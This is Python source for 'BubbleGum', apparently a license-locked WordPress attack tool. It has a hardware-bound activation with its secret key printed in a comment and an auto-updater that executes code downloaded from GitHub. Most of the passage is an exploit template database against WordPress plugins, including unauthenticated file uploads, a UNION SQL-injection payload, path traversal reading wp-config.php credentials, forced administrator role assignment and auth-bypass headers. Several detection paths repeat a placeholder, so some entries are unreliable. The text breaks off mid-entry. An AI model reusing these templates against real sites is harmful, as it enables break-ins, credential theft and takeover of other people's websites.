"""
BubbleGum — Machine-Bound Launcher
Serves bubblegum.html via localhost, with hardware-locked activation.
Auto-updates from GitHub on startup.
"""

import base64
import hashlib
import hmac
import json
import os
import re
import socket
import subprocess
import sys
import threading
import time
import ssl
import uuid
import urllib.error
import urllib.parse
import urllib.request
import webbrowser
from concurrent.futures import ThreadPoolExecutor, as_completed
from http.server import HTTPServer, SimpleHTTPRequestHandler
from pathlib import Path


# ── Auto-Updater ─────────────────────────────────────────────────────────────

GITHUB_REPO = "sandanglokta1987-dev/bubblegum"
UPDATE_FILES = ["bubblegum_app.py", "bubblegum.html"]
UPDATE_DIR = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")), "BubbleGum")


def _get_update_dir():
    """Ensure update directory exists and return its path."""
    os.makedirs(UPDATE_DIR, exist_ok=True)
    return UPDATE_DIR


def _read_local_sha():
    """Read stored commit SHA from last update."""
    sha_file = os.path.join(_get_update_dir(), ".version")
    if os.path.exists(sha_file):
        return open(sha_file, 'r').read().strip()
    return ""


def _write_local_sha(sha):
    """Store commit SHA after successful update."""
    sha_file = os.path.join(_get_update_dir(), ".version")
    with open(sha_file, 'w') as f:
        f.write(sha)


def _fetch_json(url):
    """GET a GitHub API URL, return parsed JSON."""
    req = urllib.request.Request(url, headers={
        'User-Agent': 'BubbleGum-Updater/1.0',
        'Accept': 'application/vnd.github.v3+json',
    })
    ctx = ssl.create_default_context()
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    return json.loads(resp.read().decode())


def _download_raw(url):
    """Download raw file content from GitHub."""
    req = urllib.request.Request(url, headers={
        'User-Agent': 'BubbleGum-Updater/1.0',
        'Accept': 'application/vnd.github.v3.raw',
    })
    ctx = ssl.create_default_context()
    resp = urllib.request.urlopen(req, timeout=30, context=ctx)
    return resp.read()


def auto_update():
    """Check GitHub for updates, download newer files to APPDATA.
    Returns True if bubblegum_app.py was updated (needs re-exec)."""
    try:
        # Get latest commit SHA on default branch
        api_url = f"https://api.github.com/repos/{GITHUB_REPO}/commits/master"
        commit = _fetch_json(api_url)
        remote_sha = commit["sha"]

        local_sha = _read_local_sha()
        if remote_sha == local_sha:
            print("[updater] Already up to date.")
            return False

        print(f"[updater] Update available: {remote_sha[:8]}")
        app_updated = False
        update_dir = _get_update_dir()

        for filename in UPDATE_FILES:
            raw_url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{filename}?ref=master"
            content = _download_raw(raw_url)
            dest = os.path.join(update_dir, filename)
            with open(dest, 'wb') as f:
                f.write(content)
            print(f"[updater] Updated {filename} ({len(content)} bytes)")
            if filename == "bubblegum_app.py":
                app_updated = True

        _write_local_sha(remote_sha)
        print(f"[updater] Update complete: {remote_sha[:8]}")
        return app_updated

    except Exception as e:
        print(f"[updater] Update check failed (offline?): {e}")
        return False


def _maybe_reexec():
    """If a newer bubblegum_app.py exists in APPDATA, exec it instead."""
    update_dir = _get_update_dir()
    updated_app = os.path.join(update_dir, "bubblegum_app.py")

    if not os.path.exists(updated_app):
        return  # No update yet, run bundled code

    # Don't re-exec if we're already running from the update dir
    current_file = os.path.abspath(__file__)
    if os.path.normpath(current_file) == os.path.normpath(updated_app):
        return  # Already running updated code

    # For frozen exe: exec the updated .py using the embedded Python
    # For source: exec the updated .py
    print(f"[updater] Loading updated code from {updated_app}")
    with open(updated_app, 'r', encoding='utf-8') as f:
        code = f.read()
    # Execute the updated module in place of this one
    exec(compile(code, updated_app, 'exec'), {'__name__': '__main__', '__file__': updated_app})

# ── Shared secret (obfuscated in compiled bytecode) ──────────────────────────
# Same value must appear in keygen.py
_S = [0x42,0x75,0x62,0x62,0x6C,0x65,0x47,0x75,0x6D,0x2D,
      0x53,0x33,0x63,0x72,0x33,0x74,0x2D,0x4B,0x33,0x79,
      0x2D,0x58,0x39,0x71,0x37,0x5A,0x6D,0x50,0x32,0x76,
      0x4C,0x38]
SECRET = bytes(_S).decode()  # "BubbleGum-S3cr3t-K3y-X9q7ZmP2vL8"

PORT = 8000
APP_DIR = Path(os.environ.get("APPDATA", "")) / "BubbleGum"
LICENSE_FILE = APP_DIR / "license.dat"

_vulnscan_pdf = None  # {"bytes": b"...", "filename": "test.pdf"}


# ── Machine Fingerprint ──────────────────────────────────────────────────────

def _wmic(cls, prop):
    """Run a wmic query and return first non-empty line."""
    try:
        out = subprocess.check_output(
            f"wmic {cls} get {prop}", shell=True,
            stderr=subprocess.DEVNULL, text=True
        )
        for line in out.strip().splitlines()[1:]:
            val = line.strip()
            if val:
                return val
    except Exception:
        pass
    return ""


def get_machine_id():
    """SHA-256 of MAC + CPU ID + Disk serial → 16-char hex → dash-separated groups of 4."""
    mac = format(uuid.getnode(), "012X")
    cpu = _wmic("cpu", "ProcessorId")
    disk = _wmic("diskdrive", "SerialNumber")
    raw = f"{mac}|{cpu}|{disk}"
    digest = hashlib.sha256(raw.encode()).hexdigest()[:16].upper()
    return f"{digest[:4]}-{digest[4:8]}-{digest[8:12]}-{digest[12:16]}"


# ── Activation Key ───────────────────────────────────────────────────────────

def compute_key(machine_id):
    """HMAC-SHA256 of machine_id → 20-char hex → groups of 5 dashes."""
    h = hmac.new(SECRET.encode(), machine_id.encode(), hashlib.sha256).hexdigest()[:20].upper()
    return f"{h[:5]}-{h[5:10]}-{h[10:15]}-{h[15:20]}"


# ── License Storage ──────────────────────────────────────────────────────────

def read_license():
    try:
        data = json.loads(LICENSE_FILE.read_text())
        return data.get("activation_key", "")
    except Exception:
        return ""


def write_license(key):
    APP_DIR.mkdir(parents=True, exist_ok=True)
    LICENSE_FILE.write_text(json.dumps({"activation_key": key}))


def is_activated():
    stored = read_license()
    if not stored:
        return False
    expected = compute_key(get_machine_id())
    return stored == expected


# ── Tkinter Activation Dialog ────────────────────────────────────────────────

def show_activation_dialog():
    """Block until user activates or closes the window. Returns True on success."""
    import tkinter as tk
    from tkinter import messagebox

    machine_id = get_machine_id()
    result = {"activated": False}

    root = tk.Tk()
    root.title("BubbleGum — Activation")
    root.geometry("480x320")
    root.resizable(False, False)
    root.configure(bg="#1a1a2e")

    # Try to set icon
    try:
        if getattr(sys, "frozen", False):
            icon_path = os.path.join(sys._MEIPASS, "bubblegum.ico")
        else:
            icon_path = os.path.join(os.path.dirname(__file__), "bubblegum.ico")
        if os.path.exists(icon_path):
            root.iconbitmap(icon_path)
    except Exception:
        pass

    tk.Label(root, text="BubbleGum", font=("Segoe UI", 22, "bold"),
             fg="#ff3d8b", bg="#1a1a2e").pack(pady=(30, 5))

    tk.Label(root, text="Machine-bound activation required",
             font=("Segoe UI", 10), fg="#888", bg="#1a1a2e").pack()

    # Machine ID display
    frame_mid = tk.Frame(root, bg="#1a1a2e")
    frame_mid.pack(pady=(20, 5))
    tk.Label(frame_mid, text="Machine ID:", font=("Consolas", 10),
             fg="#aaa", bg="#1a1a2e").pack(side="left", padx=(0, 8))
    mid_entry = tk.Entry(frame_mid, font=("Consolas", 12), width=22,
                         fg="#ff3d8b", bg="#2a2a3e", relief="flat",
                         readonlybackground="#2a2a3e", justify="center")
    mid_entry.insert(0, machine_id)
    mid_entry.configure(state="readonly")
    mid_entry.pack(side="left")

    # Activation key input
    tk.Label(root, text="Activation Key:", font=("Consolas", 10),
             fg="#aaa", bg="#1a1a2e").pack(pady=(20, 5))
    key_entry = tk.Entry(root, font=("Consolas", 12), width=28,
                         fg="#fff", bg="#2a2a3e", relief="flat",
                         insertbackground="#fff", justify="center")
    key_entry.pack()
    key_entry.focus_set()

    def activate():
        entered = key_entry.get().strip().upper()
        expected = compute_key(machine_id)
        if entered == expected:
            write_license(entered)
            result["activated"] = True
            root.destroy()
        else:
            messagebox.showerror("Invalid Key",
                                 "The activation key does not match this machine.",
                                 parent=root)

    btn = tk.Button(root, text="Activate", font=("Segoe UI", 11, "bold"),
                    fg="#fff", bg="#ff3d8b", activebackground="#ff6aaa",
                    relief="flat", padx=30, pady=6, cursor="hand2",
                    command=activate)
    btn.pack(pady=(20, 0))

    # Allow Enter key to activate
    root.bind("<Return>", lambda e: activate())

    root.protocol("WM_DELETE_WINDOW", lambda: (root.destroy(),))
    root.mainloop()
    return result["activated"]


# ── Vulnerability Database ───────────────────────────────────────────────────
#
# Data-driven exploit templates.  Each entry has:
#   id, name, method, path          — required
#   body_type                       — "upload"|"raw"|"xmlrpc"|"json"|"none"
#   upload_field, extra_fields      — for body_type "upload"
#   headers                         — extra headers ({filename} is replaced)
#   success_status, success_body    — how to detect "vulnerable"
#   safe_body                       — strings that mean "safe" even on 200
#   success_detail                  — detail text shown on vulnerable
#   json_url_key                    — JSON key holding upload URL to verify
#   paths                           — list of paths to try (instead of path)
#   path_range                      — [start, end) to expand {n} in path
#   blind_test                      — run even if plugin not detected (default True)
#   affected                        — version spec e.g. "<=6.8"

VULN_DB = {
    # ╔═══════════════════════════════════════════════════════════════╗
    # ║  WORDPRESS                                                    ║
    # ╚═══════════════════════════════════════════════════════════════╝
    "wordpress": {
        "core": [
            {
                "id": "wp-rest-media", "name": "WP REST API Media Upload",
                "method": "POST", "path": "/wp-json/wp/v2/media",
                "body_type": "raw",
                "headers": {
                    "Content-Disposition": 'attachment; filename="{filename}"',
                    "Content-Type": "application/pdf",
                },
                "success_status": [201],
                "success_body": ["source_url"],
                "json_url_key": "source_url",
                "success_detail": "201 Created via REST API",
            },
            {
                "id": "wp-xmlrpc", "name": "WP XML-RPC Upload",
                "method": "POST", "path": "/xmlrpc.php",
                "body_type": "xmlrpc",
                "success_status": [200],
                "success_body": ["<name>url</name>"],
                "safe_body": ["faultString"],
                "success_detail": "XML-RPC upload accepted",
            },
            {
                "id": "wp-admin-ajax", "name": "WP Admin AJAX Upload",
                "method": "POST", "path": "/wp-admin/admin-ajax.php?action=upload-attachment",
                "body_type": "upload", "upload_field": "async-upload",
                "success_status": [200],
                "success_body": ['"url"', "uploads"],
                "success_detail": "upload accepted without nonce",
            },
            {
                "id": "wp-user-enum", "name": "WP User Enumeration",
                "method": "GET", "path": "/wp-json/wp/v2/users",
                "body_type": "none",
                "success_status": [200],
                "success_body": ['"slug"'],
                "success_detail": "user list exposed via REST API",
            },
            {
                "id": "wp-cron", "name": "WP-Cron Accessible",
                "method": "GET", "path": "/wp-cron.php",
                "body_type": "none",
                "success_status": [200],
                "success_detail": "wp-cron.php publicly accessible",
            },
        ],
        "plugins": {
            # ── File Manager plugins ─────────────────────────────
            "wp-file-manager": {
                "detect": "/wp-content/plugins/wp-file-manager/readme.txt",
                "vulns": [{
                    "id": "CVE-2020-25213", "name": "WP File Manager RCE",
                    "affected": "<=6.8",
                    "method": "POST",
                    "path": "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
                    "body_type": "upload", "upload_field": "upload[]",
                    "extra_fields": {"cmd": "upload", "target": "l1_Lw"},
                    "success_status": [200], "success_body": ['"added"'],
                    "success_detail": "upload accepted",
                }],
            },
            "file-manager-advanced": {
                "detect": "/wp-content/plugins/file-manager-advanced/readme.txt",
                "vulns": [{
                    "id": "fma-elfinder", "name": "File Manager Advanced elFinder",
                    "method": "POST",
                    "path": "/wp-content/plugins/file-manager-advanced/application/library/js/elfinder/php/connector.minimal.php",
                    "body_type": "upload", "upload_field": "upload[]",
                    "extra_fields": {"cmd": "upload", "target": "l1_Lw"},
                    "success_status": [200], "success_body": ['"added"'],
                    "success_detail": "elFinder upload accepted",
                }],
            },
            # ── Form plugins ─────────────────────────────────────
            "contact-form-7": {
                "detect": "/wp-content/plugins/contact-form-7/readme.txt",
                "vulns": [{
                    "id": "CVE-2020-35489", "name": "Contact Form 7 Upload",
                    "affected": "<=5.3.1",
                    "method": "POST",
                    "path": "/wp-json/contact-form-7/v1/contact-forms/{n}/feedback",
                    "path_range": [1, 11],
                    "body_type": "upload", "upload_field": "file-upload",
                    "success_status": [200],
                    "success_body": ["uploaded_files", "mailSent"],
                    "success_detail": "form accepted file upload",
                }],
            },
            "gravity-forms": {
                "detect": "/wp-content/plugins/gravityforms/readme.txt",
                "vulns": [{
                    "id": "gf-upload", "name": "Gravity Forms File Upload",
                    "method": "POST",
                    "paths": [
                        "/wp-admin/admin-ajax.php?action=gf_file_upload",
                        "/wp-admin/admin-ajax.php?action=rg_file_upload",
                    ],
                    "body_type": "upload", "upload_field": "file",
                    "extra_fields": {"form_id": "1", "field_id": "1"},
                    "success_status": [200],
                    "success_body": ['"url"', "uploads"],
                    "success_detail": "file upload accepted via AJAX",
                }],
            },
            "ninja-forms": {
                "detect": "/wp-content/plugins/ninja-forms/readme.txt",
                "vulns": [{
                    "id": "CVE-2019-10869", "name": "Ninja Forms File Upload",
                    "affected": "<=3.4.24.2",
                    "method": "POST",
                    "paths": [
                        "/wp-admin/admin-ajax.php?action=nf_file_upload",
                        "/wp-admin/admin-ajax.php?action=nf_fu_upload",
                    ],
                    "body_type": "upload", "upload_field": "file",
                    "success_status": [200],
                    "success_body": ["url", "tmp_name"],
                    "success_detail": "file upload accepted via AJAX",
                }],
            },
            "wpforms": {
                "detect": "/wp-content/plugins/wpforms-lite/readme.txt",
                "vulns": [{
                    "id": "wpforms-upload", "name": "WPForms File Upload",
                    "method": "POST",
                    "path": "/wp-admin/admin-ajax.php?action=wpforms_upload_chunk",
                    "body_type": "upload", "upload_field": "file",
                    "success_status": [200],
                    "success_body": ["success", "uploaded"],
                    "success_detail": "file upload accepted via AJAX",
                }],
            },
            "forminator": {
                "detect": "/wp-content/plugins/forminator/readme.txt",
                "vulns": [{
                    "id": "CVE-2024-28890", "name": "Forminator Unauth Upload",
                    "affected": "<=1.29.0",
                    "method": "POST",
                    "path": "/wp-admin/admin-ajax.php?action=forminator_upload_file",
                    "body_type": "upload", "upload_field": "file-1",
                    "success_status": [200],
                    "success_body": ["success", "url"],
                    "success_detail": "file upload accepted",
                }],
            },
            "formidable": {
                "detect": "/wp-content/plugins/formidable/readme.txt",
                "vulns": [{
                    "id": "formidable-ofc", "name": "Formidable OFC Upload",
                    "method": "POST",
                    "path": "/wp-content/plugins/formidable/pro/js/ofc-library/ofc_upload_image.php",
                    "body_type": "raw",
                    "success_status": [200],
                    "success_detail": "OFC handler accessible",
                }],
            },
            "mw-wp-form": {
                "detect": "/wp-content/plugins/mw-wp-form/readme.txt",
                "vulns": [{
                    "id": "CVE-2023-36000", "name": "MW WP Form Unauth Upload",
                    "affected": "<=5.0.1",
                    "method": "POST",
                    "path": "/wp-admin/admin-ajax.php?action=mwf_file_upload",
                    "body_type": "upload", "upload_field": "file",
                    "success_status": [200],
                    "success_body": ["success", "url", "uploaded"],
                    "success_detail": "unauthenticated upload accepted",
                }],
            },
            "hash-form": {
                "detect": "/wp-content/plugins/developer-flavor-flavor-flavor/readme.txt",
                "vulns": [{
                    "id": "CVE-2024-3050", "name": "Hash Form Unauth Upload",
                    "affected": "<=1.1.0",
                    "method": "POST",
                    "path": "/wp-admin/admin-ajax.php?action=hashform_file_upload",
                    "body_type": "upload", "upload_field": "file",
                    "success_status": [200],
                    "success_body": ["success", "url"],
                    "success_detail": "unauthenticated upload accepted",
                }],
            },
            # ── Upload-handler plugins ───────────────────────────
            "wp-file-upload": {
                "detect": "/wp-content/plugins/wp-file-upload/readme.txt",
                "vulns": [{
                    "id": "CVE-2024-9047", "name": "WP File Upload Path Traversal",
                    "affected": "<=4.24.11",
                    "method": "POST",
                    "path": "/wp-admin/admin-ajax.php?action=wfu_ajax_action",
                    "body_type": "upload", "upload_field": "uploadedfile",
                    "extra_fields": {"wfu_uploader_nonce": "", "hiddeninput": "1"},
                    "success_status": [200],
                    "success_body": ["success", "uploaded"],
                    "success_detail": "file upload accepted",
                }],
            },
            "drag-and-drop-multiple-file-upload-contact-form-7": {
                "detect": "/wp-content/plugins/drag-and-drop-multiple-file-upload-contact-form-7/readme.txt",
                "vulns": [{
                    "id": "dnd-cf7-upload", "name": "Drag & Drop Multi Upload CF7",
                    "method": "POST",
                    "path": "/wp-admin/admin-ajax.php?action=dnd_codedropz_upload",
                    "body_type": "upload", "upload_field": "upload-file",
                    "success_status": [200],
                    "success_body": ["success", "url", "uploaded"],
                    "success_detail": "file upload accepted",
                }],
            },
            "simple-file-list": {
                "detect": "/wp-content/plugins/simple-file-list/readme.txt",
                "vulns": [{
                    "id": "CVE-2023-5988", "name": "Simple File List Upload",
                    "affected": "<=6.1.9",
                    "method": "POST",
                    "path": "/wp-admin/admin-ajax.php?action=ee_upload",
                    "body_type": "upload", "upload_field": "file",
                    "success_status": [200],
                    "success_body": ["success", "uploaded"],
                    "success_detail": "file upload accepted",
                }],
            },
            "download-manager": {
                "detect": "/wp-content/plugins/download-manager/readme.txt",
                "vulns": [{
                    "id": "wpdm-upload", "name": "Download Manager Upload",
                    "method": "POST",
                    "path": "/wp-admin/admin-ajax.php?action=wpdm_upload_file",
                    "body_type": "upload", "upload_field": "file",
                    "success_status": [200],
                    "success_body": ["success", "url", "uploaded"],
                    "success_detail": "file upload accepted via AJAX",
                }],
            },
            # ── Slider / Gallery plugins ─────────────────────────
            "revslider": {
                "detect": "/wp-content/plugins/revslider/readme.txt",
                "vulns": [
                    {
                        "id": "CVE-2014-9734", "name": "RevSlider Arbitrary Upload",
                        "affected": "<=4.1.4",
                        "method": "POST",
                        "path": "/wp-admin/admin-ajax.php?action=revslider_ajax_action",
                        "body_type": "upload", "upload_field": "update_file",
                        "extra_fields": {"client_action": "update_plugin"},
                        "success_status": [200],
                        "success_body": ["success", "Update"],
                        "success_detail": "RevSlider upload accepted",
                    },
                    {
                        "id": "revslider-fileread", "name": "RevSlider File Read",
                        "affected": "<=4.1.4",
                        "method": "POST",
                        "path": "/wp-admin/admin-ajax.php",
                        "body_type": "upload", "upload_field": "dummy",
                        "extra_fields": {
                            "action": "revslider_show_image",
                            "img": "../wp-config.php",
                        },
                        "success_status": [200],
                        "success_body": ["DB_PASSWORD", "DB_NAME"],
                        "success_detail": "arbitrary file read confirmed",
                    },
                ],
            },
            "smart-slider-3": {
                "detect": "/wp-content/plugins/developer-flavor-flavor-flavor/readme.txt",
                "vulns": [{
                    "id": "smartslider-upload", "name": "Smart Slider 3 Upload",
                    "method": "POST",
                    "path": "/wp-admin/admin-ajax.php?action=smart_slider_3_upload",
                    "body_type": "upload", "upload_field": "file",
                    "success_status": [200],
                    "success_body": ["success", "url"],
                    "success_detail": "slider upload accepted",
                }],
            },
            "nextgen-gallery": {
                "detect": "/wp-content/plugins/nextgen-gallery/readme.txt",
                "vulns": [{
                    "id": "ngg-upload", "name": "NextGEN Gallery Upload",
                    "method": "POST",
                    "path": "/wp-admin/admin-ajax.php?action=ngg_ajax_upload",
                    "body_type": "upload", "upload_field": "file",
                    "success_status": [200],
                    "success_body": ["success", "image_id", "url"],
                    "success_detail": "gallery upload accepted",
                }],
            },
            # ── Page Builder plugins ─────────────────────────────
            "elementor": {
                "detect": "/wp-content/plugins/elementor/readme.txt",
                "vulns": [{
                    "id": "elementor-upload", "name": "Elementor Upload Handler",
                    "method": "POST",
                    "path": "/wp-admin/admin-ajax.php?action=elementor_upload_image",
                    "body_type": "upload", "upload_field": "file",
                    "success_status": [200],
                    "success_body": ['"url"', "uploads"],
                    "success_detail": "Elementor upload accepted",
                }],
            },
            "royal-elementor-addons": {
                "detect": "/wp-content/plugins/royal-elementor-addons/readme.txt",
                "vulns": [{
                    "id": "CVE-2023-5360", "name": "Royal Elementor Addons Unauth Upload",
                    "affected": "<=1.3.78",
                    "method": "POST",
                    "path": "/wp-admin/admin-ajax.php?action=wpr_addons_upload_file",
                    "body_type": "upload", "upload_field": "file",
                    "success_status": [200],
                    "success_body": ["url", "success", "uploads"],
                    "success_detail": "unauthenticated upload accepted",
                }],
            },
            "essential-addons-for-elementor": {
                "detect": "/wp-content/plugins/essential-addons-for-elementor-lite/readme.txt",
                "vulns": [{
                    "id": "CVE-2023-32243", "name": "Essential Addons Priv Escalation",
                    "affected": "<=5.7.1",
                    "method": "POST",
                    "path": "/wp-admin/admin-ajax.php?action=eael_reset_password",
                    "body_type": "upload", "upload_field": "file",
                    "extra_fields": {"rp_login": "admin"},
                    "success_status": [200],
                    "success_body": ["success", "reset"],
                    "success_detail": "password reset bypass responded",
                }],
            },
            "tatsu": {
                "detect": "/wp-content/plugins/developer-flavor-flavor-flavor/readme.txt",
                "vulns": [{
                    "id": "CVE-2021-25094", "name": "Tatsu Builder Unauth Upload",
                    "affected": "<=3.3.11",
                    "method": "POST",
                    "path": "/wp-admin/admin-ajax.php?action=add_custom_font",
                    "body_type": "upload", "upload_field": "custom_font",
                    "success_status": [200],
                    "success_body": ["success", "uploaded"],
                    "success_detail": "font upload accepted without auth",
                }],
            },
            "brizy": {
                "detect": "/wp-content/plugins/developer-flavor-flavor-flavor/readme.txt",
                "vulns": [{
                    "id": "brizy-upload", "name": "Brizy Builder Upload",
                    "method": "POST",
                    "path": "/wp-admin/admin-ajax.php?action=brizy_upload",
                    "body_type": "upload", "upload_field": "file",
                    "success_status": [200],
                    "success_body": ["success", "url"],
                    "success_detail": "Brizy upload accepted",
                }],
            },
            # ── E-Commerce plugins ───────────────────────────────
            "woocommerce": {
                "detect": "/wp-content/plugins/woocommerce/readme.txt",
                "vulns": [{
                    "id": "woo-product-upload", "name": "WooCommerce Product Image Upload",
                    "method": "POST",
                    "path": "/wp-json/wc/v3/products/1/add-image-data",
                    "body_type": "raw",
                    "headers": {"Content-Type": "application/pdf"},
                    "success_status": [200, 201],
                    "success_detail": "missing file type validation",
                }],
            },
            "woocommerce-payments": {
                "detect": "/wp-content/plugins/woocommerce-payments/readme.txt",
                "vulns": [{
                    "id": "CVE-2023-28121", "name": "WooCommerce Payments Auth Bypass",
                    "affected": "<=5.6.1",
                    "method": "POST",
                    "path": "/wp-json/wp/v2/media",
                    "body_type": "raw",
                    "headers": {
                        "Content-Disposition": 'attachment; filename="{filename}"',
                        "Content-Type": "application/pdf",
                        "X-WCPAY-PLATFORM-CHECKOUT-USER": "1",
                    },
                    "success_status": [201],
                    "success_body": ["source_url"],
                    "json_url_key": "source_url",
                    "success_detail": "auth bypass via WCPAY header, file uploaded",
                }],
            },
            "modern-events-calendar-lite": {
                "detect": "/wp-content/plugins/modern-events-calendar-lite/readme.txt",
                "vulns": [{
                    "id": "CVE-2024-4835", "name": "Modern Events Calendar Upload",
                    "affected": "<=7.11.0",
                    "method": "POST",
                    "path": "/wp-admin/admin-ajax.php?action=mec_import_settings",
                    "body_type": "upload", "upload_field": "file",
                    "success_status": [200],
                    "success_body": ["success", "imported"],
                    "success_detail": "unauthenticated upload accepted",
                }],
            },
            "bookingpress": {
                "detect": "/wp-content/plugins/bookingpress-appointment-booking/readme.txt",
                "vulns": [{
                    "id": "CVE-2022-0739", "name": "BookingPress SQLi",
                    "affected": "<=1.0.10",
                    "method": "POST",
                    "path": "/wp-admin/admin-ajax.php",
                    "body_type": "upload", "upload_field": "file",
                    "extra_fields": {
                        "action": "bookingpress_front_get_category_services",
                        "category_id": "1 UNION SELECT 1,user(),3,4,5,6,7,8-- -",
                    },
                    "success_status": [200],
                    "success_body": ["root@", "@localhost"],
                    "success_detail": "SQL injection confirmed",
                }],
            },
            # ── Framework / Utility plugins ──────────────────────
            "redux-framework": {
                "detect": "/wp-content/plugins/redux-framework/readme.txt",
                "vulns": [{
                    "id": "CVE-2024-6828", "name": "Redux Framework Unauth Upload",
                    "affected": "<=4.4.17",
                    "method": "POST",
                    "path": "/wp-admin/admin-ajax.php?action=redux_color_scheme_import",
                    "body_type": "upload", "upload_field": "file",
                    "success_status": [200],
                    "success_body": ["success", "imported"],
                    "success_detail": "file accepted without auth",
                }],
            },
            "ai-engine": {
                "detect": "/wp-content/plugins/developer-flavor-flavor-flavor/readme.txt",
                "vulns": [{
                    "id": "CVE-2024-0964", "name": "AI Engine Unauth Upload",
                    "affected": "<=2.1.4",
                    "method": "POST",
                    "path": "/wp-admin/admin-ajax.php?action=mwai_upload_image",
                    "body_type": "upload", "upload_field": "file",
                    "success_status": [200],
                    "success_body": ["success", "url"],
                    "success_detail": "unauthenticated upload accepted",
                }],
            },
            "social-warfare": {
                "detect": "/wp-content/plugins/social-warfare/readme.txt",
                "vulns": [{
                    "id": "CVE-2019-9978", "name": "Social Warfare RCE",
                    "affected": "<=3.5.2",
                    "method": "GET",
                    "path": "/?swp_debug=load_options",
                    "body_type": "none",
                    "success_status": [200],
                    "success_body": ["swp_options", "social_warfare"],
                    "success_detail": "debug endpoint exposed (RCE chain possible)",
                }],
            },
            # ── Import / Migration plugins ───────────────────────
            "all-in-one-wp-migration": {
                "detect": "/wp-content/plugins/all-in-one-wp-migration/readme.txt",
                "vulns": [{
                    "id": "CVE-2023-6553", "name": "All-in-One Migration RCE",
                    "affected": "<=7.77",
                    "method": "POST",
                    "path": "/wp-content/plugins/all-in-one-wp-migration/lib/vendor/servmask/pro/import.php",
                    "body_type": "raw",
                    "success_status": [200],
                    "success_body": ["success", "import"],
                    "success_detail": "import endpoint accessible",
                }],
            },
            "starter-templates": {
                "detect": "/wp-content/plugins/astra-sites/readme.txt",
                "vulns": [{
                    "id": "starter-tpl-upload", "name": "Starter Templates Import",
                    "method": "POST",
                    "paths": [
                        "/wp-admin/admin-ajax.php?action=starter_templates_import_media",
                        "/wp-json/starter-templates/v1/import-media",
                    ],
                    "body_type": "upload", "upload_field": "file",
                    "success_status": [200],
                    "success_body": ["success", "url", "uploaded"],
                    "success_detail": "import upload accepted",
                }],
            },
            "wp-all-import": {
                "detect": "/wp-content/plugins/developer-flavor-flavor-flavor/readme.txt",
                "vulns": [{
                    "id": "CVE-2022-1565", "name": "WP All Import Upload",
                    "affected": "<=3.6.7",
                    "method": "POST",
                    "paths": [
                        "/wp-admin/admin-ajax.php?action=pmxi_upload",
                        "/wp-admin/admin-ajax.php?action=upload_file",
                    ],
                    "body_type": "upload", "upload_field": "file",
                    "success_status": [200],
                    "success_body": ["success", "url", "uploaded"],
                    "success_detail": "import upload accepted",
                }],
            },
            "themegrill-demo-importer": {
                "detect": "/wp-content/plugins/developer-flavor-flavor-flavor/readme.txt",
                "vulns": [{
                    "id": "CVE-2020-5375", "name": "ThemeGrill Demo Importer Wipe",
                    "affected": "<=1.6.1",
                    "method": "POST",
                    "path": "/wp-admin/admin-ajax.php?action=reset_flavor",
                    "body_type": "upload", "upload_field": "file",
                    "success_status": [200],
                    "success_body": ["success", "reset"],
                    "success_detail": "reset endpoint accessible (DB wipe risk)",
                }],
            },
            "duplicator": {
                "detect": "/wp-content/plugins/duplicator/readme.txt",
                "vulns": [{
                    "id": "CVE-2020-11738", "name": "Duplicator Arbitrary File Read",
                    "affected": "<=1.3.28",
                    "method": "GET",
                    "path": "/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../wp-config.php",
                    "body_type": "none",
                    "success_status": [200],
                    "success_body": ["DB_PASSWORD", "DB_NAME", "DB_HOST"],
                    "success_detail": "arbitrary file read confirmed",
                }],
            },
            # ── Auth Bypass / Privilege Escalation plugins ───────
            "ultimate-member": {
                "detect": "/wp-content/plugins/developer-flavor-flavor-flavor/readme.txt",
                "vulns": [{
                    "id": "CVE-2023-3460", "name": "Ultimate Member Priv Escalation",
                    "affected": "<=2.6.6",
                    "method": "POST",
                    "path": "/wp-admin/admin-ajax.php?action=um_submit_form_data",
                    "body_type": "upload", "upload_field": "profile_photo",
                    "extra_fields": {
                        "form_id": "1",
                        "wp_capabilities[administrator]": "1",
                    },
                    "success_status": [200],
                    "success_body": ["success", "uploaded"],
                    "success_detail": "privilege escalation + upload responded",
                }],
            },
            "profilepress": {
                "detect": "/wp-content/plugins/developer-flavor-flavor-flavor/readme.txt",
                "vulns": [{
                    "id": "CVE-2021-34621", "name": "ProfilePress Admin Registration",
                    "affected": "<=3.1.3",
                    "method": "POST",
                    "path": "/wp-admin/admin-ajax.php?action=pp_ajax_signup",
                    "body_type": "upload", "upload_field": "profile_photo",
                    "extra_fields": {
                        "reg_username": "bgtest",
                        "reg_email": "test@test.com",
                        "reg_password": "Test12345!",
                        "wp_capabilities[administrator]": "1",
                    },
                    "success_status": [200],
                    "success_body": ["success", "registered"],
                    "success_detail": "admin registration responded",
                }],
            },
            "litespeed-cache": {
                "detect": "/wp-content/plugins/litespeed-cache/readme.txt",
                "vulns": [{
                    "id": "CVE-2024-28000", "name": "LiteSpeed Cache Priv Escalation",
                    "affected": "<=6.3.0.1",
                    "method": "POST",
                    "path": "/wp-json/wp/v2/media",
                    "body_type": "raw",
                    "headers": {
                        "Content-Disposition": 'attachment; filename="{filename}"',
                        "Content-Type": "application/pdf",
                        "Cookie": "litespeed_role=administrator",
                    },
                    "success_status": [201],
                    "success_body": ["source_url"],
                    "success_detail": "LiteSpeed role simulation responded",
                }],
            },
            "wp-gdpr-compliance": {
                "detect": "/wp-content/plugins/developer-flavor-flavor-flavor/readme.txt",
                "vulns": [{
                    "id": "CVE-2018-19207", "name": "WP GDPR Compliance Priv Esc",
                    "affected": "<=1.4.2",
                    "method": "POST",
                    "path": "/wp-admin/admin-ajax.php?action=wpgdprc_process_action",
                    "body_type": "upload", "upload_field": "file",
                    "extra_fields": {
                        "data": '{"type":"save_setting","option":"default_role","value":"administrator"}',
                    },
                    "success_status": [200],
                    "success_body": ["success"],
                    "success_detail": "settings update endpoint accessible",
                }],
            },
            "infinitewp-client": {
                "detect": "/wp-content/plugins/developer-flavor-flavor-flavor/readme.txt",
                "vulns": [{
                    "id": "CVE-2020-8772", "name": "InfiniteWP Auth Bypass",
                    "affected": "<=1.9.4.4",
                    "method": "POST",
                    "path": "/",
                    "body_type": "raw",
                    "headers": {"Content-Type": "application/json"},
                    "success_status": [200],
                    "success_body": ["iwp_action", "success"],
                    "success_detail": "IWP auth bypass responded",
                    "blind_test": False,
                }],
            },
            "post-smtp": {
